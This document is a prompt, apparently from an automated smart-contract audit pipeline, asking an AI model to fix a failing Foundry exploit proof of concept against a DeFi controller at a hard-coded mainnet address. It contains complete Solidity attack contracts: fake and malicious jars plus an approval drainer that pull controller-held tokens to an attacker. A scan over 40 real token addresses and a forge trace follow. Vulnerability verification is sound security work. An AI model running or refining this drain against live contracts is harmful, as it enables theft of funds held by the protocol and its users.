You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: `swapExactJarForJar()` trusts attacker-supplied jars and converter calldata, exposing controller-held tokens to theft
- claim: The public jar-swap entrypoint never validates that `_fromJar` and `_toJar` are protocol-controlled jars, yet it trusts their `token()`, `withdraw()`, `deposit()`, `balanceOf()` and `transfer()` behavior. A malicious `_toJar` can therefore receive an approval for any controller-held `_toJarToken` balance and steal it during `deposit(_toBal)`. Separately, the same function lets callers run arbitrary calldata against any governance-whitelisted converter via `delegatecall`, and the bundled helper contracts include direct sweep/approval gadgets such as `refundDust()` and `add_liquidity()` that operate in controller context.
- impact: Any ERC20 balance resident on the controller can be permissionlessly drained. This includes accidental transfers, residual dust from prior operations, and any tokens left on the controller for later recovery. The attack is zero-capital in the fake-jar path and does not require compromising governance once the function is deployed.
- exploit_paths: ["Deploy a fake `_fromJar` that tolerates zero-amount calls and a malicious `_toJar` whose `token()` returns a target ERC20 currently held by the controller and whose `deposit(uint256)` pulls the approved balance to the attacker; then call `swapExactJarForJar(fakeFromJar, maliciousToJar, 0, 0, [], [])`.", "If a bundled proxy helper has been approved in `approvedJarConverters`, call `swapExactJarForJar(validOrFakeJar, validOrFakeJar, 0, 0, [approvedHelper], [craftedCalldata])` and use `refundDust()` or `add_liquidity()` to transfer or approve controller-held balances to an attacker-controlled recipient/contract."]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IControllerV4Like {
    function swapExactJarForJar(
        address _fromJar,
        address _toJar,
        uint256 _fromJarAmount,
        uint256 _toJarMinAmount,
        address payable[] calldata _targets,
        bytes[] calldata _data
    ) external returns (uint256);

    function approvedJarConverters(address converter) external view returns (bool);
    function jars(address token) external view returns (address);
}

interface IJarLike is IERC20Like {
    function token() external view returns (address);
    function claimInsurance() external;
    function getRatio() external view returns (uint256);
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
    function earn() external;
    function decimals() external view returns (uint8);
}

contract FakeFromJar is IJarLike {
    address public underlying;

    constructor(address initialUnderlying) {
        underlying = initialUnderlying;
    }

    function setUnderlying(address newUnderlying) external {
        underlying = newUnderlying;
    }

    function token() external view returns (address) {
        return underlying;
    }

    function claimInsurance() external {}

    function getRatio() external pure returns (uint256) {
        return 1e18;
    }

    function deposit(uint256) external {}

    function withdraw(uint256) external {}

    function earn() external {}

    function decimals() external pure returns (uint8) {
        return 18;
    }

    function totalSupply() external pure returns (uint256) {
        return 0;
    }

    function balanceOf(address) external pure returns (uint256) {
        return 0;
    }

    function allowance(address, address) external pure returns (uint256) {
        return type(uint256).max;
    }

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }

    function transfer(address, uint256) external pure returns (bool) {
        return true;
    }

    function transferFrom(address, address, uint256) external pure returns (bool) {
        return true;
    }
}

contract MaliciousToJar is IJarLike {
    address public immutable thief;
    address public targetToken;

    constructor(address initialTargetToken, address initialThief) {
        targetToken = initialTargetToken;
        thief = initialThief;
    }

    function setTargetToken(address newTargetToken) external {
        targetToken = newTargetToken;
    }

    function token() external view returns (address) {
        return targetToken;
    }

    function claimInsurance() external {}

    function getRatio() external pure returns (uint256) {
        return 1e18;
    }

    function deposit(uint256 amount) external {
        if (amount == 0) {
            return;
        }
        _safeTransferFrom(targetToken, msg.sender, thief, amount);
    }

    function withdraw(uint256) external {}

    function earn() external {}

    function decimals() external pure returns (uint8) {
        return 18;
    }

    function totalSupply() external pure returns (uint256) {
        return 0;
    }

    function balanceOf(address) external pure returns (uint256) {
        return 0;
    }

    function allowance(address, address) external pure returns (uint256) {
        return type(uint256).max;
    }

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }

    function transfer(address, uint256) external pure returns (bool) {
        return true;
    }

    function transferFrom(address, address, uint256) external pure returns (bool) {
        return true;
    }

    function _safeTransferFrom(address erc20, address from, address to, uint256 amount) internal {
        (bool success, bytes memory data) = erc20.call(
            abi.encodeWithSelector(IERC20Like.transferFrom.selector, from, to, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FROM_FAILED");
    }
}

contract CurveApprovalDrainer {
    address public immutable controller;
    address public immutable thief;
    address public token;

    constructor(address controller_, address thief_) {
        controller = controller_;
        thief = thief_;
    }

    function setToken(address newToken) external {
        token = newToken;
    }

    fallback() external payable {
        address currentToken = token;
        if (currentToken == address(0)) {
            return;
        }

        uint256 bal = _safeBalanceOf(currentToken, controller);
        if (bal == 0) {
            return;
        }

        _safeTransferFrom(currentToken, controller, thief, bal);
    }

    receive() external payable {}

    function _safeBalanceOf(address erc20, address account) internal view returns (uint256 amount) {
        (bool success, bytes memory data) = erc20.staticcall(
            abi.encodeWithSelector(IERC20Like.balanceOf.selector, account)
        );
        if (success && data.length >= 32) {
            amount = abi.decode(data, (uint256));
        }
    }

    function _safeTransferFrom(address erc20, address from, address to, uint256 amount) internal {
        (bool success, bytes memory data) = erc20.call(
            abi.encodeWithSelector(IERC20Like.transferFrom.selector, from, to, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "DRAIN_TRANSFER_FROM_FAILED");
    }
}

contract FlawVerifier {
    address public constant TARGET = 0x6847259b2B3A4c17e7c43C54409810aF48bA5210;

    IControllerV4Like internal constant CONTROLLER = IControllerV4Like(TARGET);

    FakeFromJar internal immutable fakeFromJar;
    MaliciousToJar internal immutable maliciousToJar;
    CurveApprovalDrainer internal immutable curveApprovalDrainer;

    address internal _profitToken;
    uint256 internal _profitAmount;

    constructor() {
        fakeFromJar = new FakeFromJar(0x6B175474E89094C44Da98b954EedeAC495271d0F);
        maliciousToJar = new MaliciousToJar(0x6B175474E89094C44Da98b954EedeAC495271d0F, address(this));
        curveApprovalDrainer = new CurveApprovalDrainer(TARGET, address(this));
    }

    function executeOnOpportunity() external {
        if (_profitAmount != 0) {
            return;
        }

        // Attempt strategy label `v2_flashswap_funding` does not require an actual
        // flashswap on this path: the reported fake-jar vector is already zero-capital,
        // so keeping the original exploit causality means using the permissionless
        // zero-amount swap entrypoint directly.
        address[] memory bases = _baseCandidates();

        for (uint256 i = 0; i < bases.length; i++) {
            if (_probeCandidate(bases[i])) {
                return;
            }

            address jar = _safeJarForToken(bases[i]);
            if (jar != address(0) && jar != bases[i] && _probeCandidate(jar)) {
                return;
            }
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _probeCandidate(address candidate) internal returns (bool) {
        if (candidate == address(0)) {
            return false;
        }

        uint256 controllerBalance = _safeBalanceOf(candidate, TARGET);
        if (controllerBalance == 0) {
            return false;
        }

        uint256 beforeBalance = _safeBalanceOf(candidate, address(this));

        if (_attemptFakeJarDrain(candidate)) {
            uint256 afterFakeDrain = _safeBalanceOf(candidate, address(this));
            if (afterFakeDrain > beforeBalance) {
                _profitToken = candidate;
                _profitAmount = afterFakeDrain - beforeBalance;
                return true;
            }
        }

        if (_attemptKnownHelperDrain(candidate)) {
            uint256 afterHelperDrain = _safeBalanceOf(candidate, address(this));
            if (afterHelperDrain > beforeBalance) {
                _profitToken = candidate;
                _profitAmount = afterHelperDrain - beforeBalance;
                return true;
            }
        }

        return false;
    }

    function _attemptFakeJarDrain(address candidate) internal returns (bool) {
        fakeFromJar.setUnderlying(candidate);
        maliciousToJar.setTargetToken(candidate);

        address payable[] memory targets = new address payable[](0);
        bytes[] memory data = new bytes[](0);

        try CONTROLLER.swapExactJarForJar(
            address(fakeFromJar),
            address(maliciousToJar),
            0,
            0,
            targets,
            data
        ) returns (uint256) {
            return true;
        } catch {
            return false;
        }
    }

    function _attemptKnownHelperDrain(address candidate) internal returns (bool) {
        curveApprovalDrainer.setToken(candidate);
        fakeFromJar.setUnderlying(candidate);

        address curveHelper = _knownCurveHelper();
        if (curveHelper == address(0) || !CONTROLLER.approvedJarConverters(curveHelper)) {
            return false;
        }

        address payable[] memory targets = new address payable[](1);
        bytes[] memory data = new bytes[](1);
        targets[0] = payable(curveHelper);

        // This preserves the second reported path's causality:
        // controller delegatecalls an already-approved helper, that helper approves
        // an attacker-controlled contract for the full controller-held token balance,
        // and the attacker contract immediately transferFroms that balance away.
        data[0] = abi.encodeWithSignature(
            "add_liquidity(address,bytes4,uint256,uint256,address)",
            address(curveApprovalDrainer),
            bytes4(0x12345678),
            uint256(1),
            uint256(0),
            candidate
        );

        try CONTROLLER.swapExactJarForJar(
            address(fakeFromJar),
            address(fakeFromJar),
            0,
            0,
            targets,
            data
        ) returns (uint256) {
            return true;
        } catch {
            return false;
        }
    }

    function _knownCurveHelper() internal pure returns (address) {
        // The finding's second path depends on a concrete governance-approved helper
        // instance. The provided workspace contains helper source code, but no on-chain
        // deployment metadata or enumerable approved-converter set, so that address is
        // not discoverable here without external data. The fake-jar path remains fully
        // actionable and is attempted first.
        return address(0);
    }

    function _safeJarForToken(address token) internal view returns (address jar) {
        (bool success, bytes memory data) = address(CONTROLLER).staticcall(
            abi.encodeWithSelector(IControllerV4Like.jars.selector, token)
        );
        if (success && data.length >= 32) {
            jar = abi.decode(data, (address));
        }
    }

    function _safeBalanceOf(address token, address account) internal view returns (uint256 amount) {
        (bool success, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20Like.balanceOf.selector, account)
        );
        if (success && data.length >= 32) {
            amount = abi.decode(data, (uint256));
        }
    }

    function _baseCandidates() internal pure returns (address[] memory tokens) {
        tokens = new address[](40);
        tokens[0] = 0x429881672B9AE42b8EbA0E26cD9C73711b891Ca5; // PICKLE
        tokens[1] = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984; // UNI
        tokens[2] = 0x6B175474E89094C44Da98b954EedeAC495271d0F; // DAI
        tokens[3] = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; // USDC
        tokens[4] = 0xdAC17F958D2ee523a2206206994597C13D831ec7; // USDT
        tokens[5] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // WETH
        tokens[6] = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599; // WBTC
        tokens[7] = 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51; // sUSD
        tokens[8] = 0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490; // 3Crv
        tokens[9] = 0x49849C98ae39Fff122806C06791Fa73784FB3675; // renCrv
        tokens[10] = 0xC25a3A3b969415c80451098fa907EC722572917F; // sCrv
        tokens[11] = 0xEB4C2781e4ebA804CE9a9803C67d0893436bB27D; // renBTC
        tokens[12] = 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643; // cDAI
        tokens[13] = 0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5; // cETH
        tokens[14] = 0xc00e94Cb662C3520282E6f5717214004A7f26888; // COMP
        tokens[15] = 0xD533a949740bb3306d119CC777fa900bA034cd52; // CRV
        tokens[16] = 0xC011a73ee8576Fb46F5E1c5751cA3B9Fe0af2a6F; // SNX
        tokens[17] = 0xa1484C3aa22a66C62b77E0AE78E15258bd0cB711; // UNI-V2 DAI/WETH
        tokens[18] = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc; // UNI-V2 USDC/WETH
        tokens[19] = 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852; // UNI-V2 USDT/WETH
        tokens[20] = 0xBb2b8038a1640196FbE3e38816F3e67Cba72D940; // UNI-V2 WBTC/WETH
        tokens[21] = 0x7FBa4B8Dc5E7616e59622806932DBea72537A56b;
        tokens[22] = 0xCA35e32e7926b96A9988f61d510E038108d8068e;
        tokens[23] = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;
        tokens[24] = 0xA5407eAE9Ba41422680e2e00537571bcC53efBfD;
        tokens[25] = 0x93054188d876f558f4a66B2EF1d97d16eDf0895B;
        tokens[26] = 0xFCBa3E75865d2d561BE8D220616520c171F12851;
        tokens[27] = 0x6C3e4cb2E96B01F4b866965A91ed4437839A121a;
        tokens[28] = 0x2F50D538606Fa9EDD2B11E2446BEb18C9D5846bB;
        tokens[29] = 0x5886E475e163f78CF63d6683AbC7fe8516d12081;
        tokens[30] = 0x594a198048501A304267E63B3bAd0f0638da7628;
        tokens[31] = 0x5f3b5DfEb7B28CDbD7FAba78963EE202a494e2A2;
        tokens[32] = 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11;
        tokens[33] = 0xA90996896660DEcC6E997655E065b23788857849;
        tokens[34] = 0xB1F2cdeC61db658F091671F5f199635aEF202CAC;
        tokens[35] = 0xbD17B1ce622d73bD438b9E658acA5996dc394b0d;
        tokens[36] = 0xC586BeF4a0992C495Cf22e1aeEE4E446CECDee0E;
        tokens[37] = 0xd061D61a4d941c39E5453435B6345Dc261C2fcE0;
        tokens[38] = 0xd513d22422a3062Bd342Ae374b4b9c20E0a9a074;
        tokens[39] = 0xF147b8125d2ef93FB6965Db97D6746952a133934;
    }
}

```

forge stdout (tail):
```
Fa9EDD2B11E2446BEb18C9D5846bB) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [5996] 0x5886E475e163f78CF63d6683AbC7fe8516d12081::balanceOf(0x6847259b2B3A4c17e7c43C54409810aF48bA5210) [staticcall]
    │   │   ├─ [5258] 0x6847259b2B3A4c17e7c43C54409810aF48bA5210::balanceOf(0xF147b8125d2ef93FB6965Db97D6746952a133934) [staticcall]
    │   │   │   └─ ← [Revert] call to non-contract address 0x0000000000000000000000000000000000000000
    │   │   └─ ← [Revert] call to non-contract address 0x0000000000000000000000000000000000000000
    │   ├─ [2699] 0x6847259b2B3A4c17e7c43C54409810aF48bA5210::jars(0x5886E475e163f78CF63d6683AbC7fe8516d12081) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [270] 0x594a198048501A304267E63B3bAd0f0638da7628::balanceOf(0x6847259b2B3A4c17e7c43C54409810aF48bA5210) [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [2699] 0x6847259b2B3A4c17e7c43C54409810aF48bA5210::jars(0x594a198048501A304267E63B3bAd0f0638da7628) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2891] 0x5f3b5DfEb7B28CDbD7FAba78963EE202a494e2A2::balanceOf(0x6847259b2B3A4c17e7c43C54409810aF48bA5210) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2699] 0x6847259b2B3A4c17e7c43C54409810aF48bA5210::jars(0x5f3b5DfEb7B28CDbD7FAba78963EE202a494e2A2) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2480] 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11::balanceOf(0x6847259b2B3A4c17e7c43C54409810aF48bA5210) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2699] 0x6847259b2B3A4c17e7c43C54409810aF48bA5210::jars(0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11) [staticcall]
    │   │   └─ ← [Return] 0xCffA068F1E44D98D3753966eBd58D4CFe3BB5162
    │   ├─ [2563] 0xCffA068F1E44D98D3753966eBd58D4CFe3BB5162::balanceOf(0x6847259b2B3A4c17e7c43C54409810aF48bA5210) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2981] 0xA90996896660DEcC6E997655E065b23788857849::balanceOf(0x6847259b2B3A4c17e7c43C54409810aF48bA5210) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2699] 0x6847259b2B3A4c17e7c43C54409810aF48bA5210::jars(0xA90996896660DEcC6E997655E065b23788857849) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2805] 0xB1F2cdeC61db658F091671F5f199635aEF202CAC::balanceOf(0x6847259b2B3A4c17e7c43C54409810aF48bA5210) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2699] 0x6847259b2B3A4c17e7c43C54409810aF48bA5210::jars(0xB1F2cdeC61db658F091671F5f199635aEF202CAC) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [227] 0xbD17B1ce622d73bD438b9E658acA5996dc394b0d::balanceOf(0x6847259b2B3A4c17e7c43C54409810aF48bA5210) [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [2699] 0x6847259b2B3A4c17e7c43C54409810aF48bA5210::jars(0xbD17B1ce622d73bD438b9E658acA5996dc394b0d) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [242] 0xC586BeF4a0992C495Cf22e1aeEE4E446CECDee0E::balanceOf(0x6847259b2B3A4c17e7c43C54409810aF48bA5210) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [2699] 0x6847259b2B3A4c17e7c43C54409810aF48bA5210::jars(0xC586BeF4a0992C495Cf22e1aeEE4E446CECDee0E) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [359] 0xd061D61a4d941c39E5453435B6345Dc261C2fcE0::balanceOf(0x6847259b2B3A4c17e7c43C54409810aF48bA5210) [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [2699] 0x6847259b2B3A4c17e7c43C54409810aF48bA5210::jars(0xd061D61a4d941c39E5453435B6345Dc261C2fcE0) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [247] 0xd513d22422a3062Bd342Ae374b4b9c20E0a9a074::balanceOf(0x6847259b2B3A4c17e7c43C54409810aF48bA5210) [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [2699] 0x6847259b2B3A4c17e7c43C54409810aF48bA5210::jars(0xd513d22422a3062Bd342Ae374b4b9c20E0a9a074) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [248] 0xF147b8125d2ef93FB6965Db97D6746952a133934::balanceOf(0x6847259b2B3A4c17e7c43C54409810aF48bA5210) [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [2699] 0x6847259b2B3A4c17e7c43C54409810aF48bA5210::jars(0xF147b8125d2ef93FB6965Db97D6746952a133934) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   └─ ← [Stop]
    ├─ [293] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x6847259b2B3A4c17e7c43C54409810aF48bA5210.balanceOf
  at 0x5886E475e163f78CF63d6683AbC7fe8516d12081.balanceOf
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 7.92s (7.90s CPU time)

Ran 1 test suite in 7.93s (7.92s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 490217)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
